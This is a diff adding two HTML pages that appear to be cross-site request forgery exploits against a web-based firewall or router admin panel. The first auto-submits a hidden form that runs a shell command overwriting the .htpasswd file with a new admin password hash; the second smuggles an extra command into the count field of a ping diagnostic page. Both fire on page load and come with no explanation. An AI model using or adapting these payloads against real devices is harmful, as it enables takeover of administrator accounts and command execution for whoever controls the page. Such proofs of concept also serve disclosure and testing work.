@@ -1,0 +1,19 @@
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;form name=&#039;x&#039; action=&#039;http://www.example.com/exec.php&#039; method=&#039;post&#039;&gt;
+      &lt;input type=&#039;hidden&#039; name=&#039;txtCommand&#039; value=&#039;echo &quot;admin:\$1\$UHzbn8k6\$RmvocDPCsXm0uW4SYZAcA/&quot; &gt; /usr/local/www/.htpasswd&#039; /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;document.forms[&#039;x&#039;].submit();&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;form name=&#039;x&#039; action=&#039;http:///www.example.com/diag_ping.php&#039; method=&#039;post&#039;&gt;
+      &lt;input type=&#039;hidden&#039; name=&#039;count&#039; value=&#039;1;ls -la;&#039; /&gt;
+      &lt;input type=&#039;hidden&#039; name=&#039;host&#039; value=&#039;127.0.0.1&#039; /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;document.forms[&#039;x&#039;].submit();&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
